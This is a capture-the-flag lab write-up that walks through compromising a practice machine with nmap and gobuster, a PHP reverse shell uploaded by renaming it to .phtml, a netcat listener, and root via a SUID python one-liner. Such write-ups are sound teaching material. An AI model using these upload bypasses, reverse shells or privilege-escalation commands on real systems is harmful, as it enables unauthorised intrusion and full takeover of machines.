
## Information Gathering

Near 64 ttl ICMP request reply suggests host is Linux based.

![[Pasted image 20241201191828.png]]

> Scan the machine, how many ports are open?

Comand used:

``` bash
sudo nmap -sS -T5 -sV -O -vvv 10.10.73.71 -oN nmap.txt  
```

Output:

``` java
# Nmap 7.94SVN scan initiated Sun Dec  1 19:21:00 2024 as: nmap -sS -T5 -sV -O -vvv -oN nmap.txt 10.10.73.71
Nmap scan report for 10.10.73.71
Host is up, received echo-reply ttl 63 (0.11s latency).
Scanned at 2024-12-01 19:21:01 CET for 14s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
OS fingerprint not ideal because: Timing level 5 (Insane) used
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (93%), Linux 3.1 - 3.2 (93%), Linux 3.11 (93%), Linux 3.2 - 4.9 (93%), Linux 3.5 (93%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.94SVN%E=4%D=12/1%OT=22%CT=1%CU=43436%PV=Y%DS=2%DC=I%G=N%TM=674CA91B%P=x86_64-pc-linux-gnu)
SEQ(SP=FD%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)
SEQ(SP=FE%GCD=1%ISR=10D%TI=Z%CI=Z%TS=A)
OPS(O1=M509ST11NW6%O2=M509ST11NW6%O3=M509NNT11NW6%O4=M509ST11NW6%O5=M509ST11NW6%O6=M509ST11)
WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)
ECN(R=Y%DF=Y%T=40%W=F507%O=M509NNSNW6%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 38.398 days (since Thu Oct 24 10:47:40 2024)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=253 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Dec  1 19:21:15 2024 -- 1 IP address (1 host up) scanned in 14.60 seconds

```

Reply: 2 open ports.

> What version of Apache is running?

From the nmap service scanning output:

``` java
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
```

So reply: 2.4.29

> What service is running on port 22?

Reply: SSH as per usual

> Find directories on the web server using the GoBuster tool.

Command used:

``` bash
gobuster dir -u http://10.10.73.71 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.txt
```

> What is the hidden directory?

Reply:

![[Pasted image 20241201193635.png]]

## Exploitation

> Find a form to upload and get a reverse shell, and find the flag.

I will be using https://github.com/pentestmonkey/php-reverse-shell

I try to upload it but fail:

![[Pasted image 20241201194024.png]]

Lets try changing the extension:

``` bash
mv php_reverse_shell.php php_reverse_shell.phtml
```

![[Pasted image 20241201194139.png]]

It works!

Lets start a listener an open the file:

``` bash
nc -nlvp 1234
```

As soon as i click on "Veja" I get a reverse shell:

![[Pasted image 20241201194233.png]]


## Privilege Escalation

Lets spawn a better shell:

``` bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

>Search for files with SUID permission, which file is weird?

Command used:

``` bash
find . -perm /4000
```

Reply: /usr/bin/python

> Find a form to escalate your privileges.

From GTFObins:

``` bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

And that's it, we are root.

